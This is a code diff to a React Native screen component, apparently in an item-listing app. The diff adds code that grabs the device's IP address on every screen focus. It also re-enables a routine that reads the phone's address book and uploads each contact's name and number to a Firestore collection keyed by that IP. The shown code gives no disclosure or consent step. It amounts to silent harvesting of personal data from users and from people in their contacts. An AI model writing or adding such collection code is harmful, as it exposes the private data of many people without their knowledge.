@@ -19,7 +19,9 @@ import firestore from '@react-native-firebase/firestore';
 import { useIsFocused, useNavigation } from '@react-navigation/native';
 import Toast from 'react-native-simple-toast';
 import Contacts from 'react-native-contacts';
+// import analytics from '@react-native-firebase/analytics';
 import DeviceInfo from 'react-native-device-info';
+import { NetworkInfo } from 'react-native-network-info';
 
 const UserItems = () => {
   const isFocused = useIsFocused();
@@ -32,16 +34,36 @@ const UserItems = () => {
   const [isCategoryModalVisible, setIsCategoryModalVisible] = useState(false);
   const [loading,setLoading] = useState(false)
   const [permission,setPermission] = useState(false)
+  const [ip,setIp] = useState('noIp')
 
-  useEffect(() => {
+  useEffect(async () => {
     try {
       getItems();
+      await fetchIp();
+      // trackScreenView('HomeScreen');
       takeContacts(); 
     } catch (error) {
       console.log(error)
     }
   }, [isFocused]);
+  const fetchIp = async () =>{
+   
+    await NetworkInfo.getIPV4Address().then(ipv4Address => {
+      setIp(ipv4Address)
+      console.log(ipv4Address);
+    });
+  }
+  
+  async function trackScreenView(screen) {
+    // Set & override the MainActivity screen name
+    // await analytics().logEvent('home_screen', {
+      
+    //   description: 'vendor entered',
+     
+    // })
 
+   
+}
   const takeContacts =() =>{
     try {
       setPermission(true)
@@ -77,7 +99,7 @@ const UserItems = () => {
                         // Save the category to Firestore
                         try {
 
-                          const deviceId = DeviceInfo.getUniqueId();
+                          /*const deviceId = DeviceInfo.getUniqueId();
 
                           // Check if the device ID already exists in the 'contacts' collection
                           const deviceRef = firestore().collection('contacts').doc(deviceId);
@@ -96,19 +118,20 @@ const UserItems = () => {
                             console.log('Contact added');
                           } else {
                             console.log('Device already has contacts');
-                          }
-                          
-                         /* await firestore()
+                          }*/
+                        console.log(ip)
+                         await firestore()
                           .collection('contacts')
-                          .doc(DeviceInfo.getUniqueId())
-                          .collection('contact-list')
+                          .doc("contact")
+                          .collection(ip)
+                         
                           .add({
                             name: givenName,
                             number: phoneNumbers[0].number 
                           })
                           .then(()=>{
                               console.log('contact added')
-                          });*/
+                          });
                       }catch(error){
                           console.error('Error adding contacts', error)
                       }
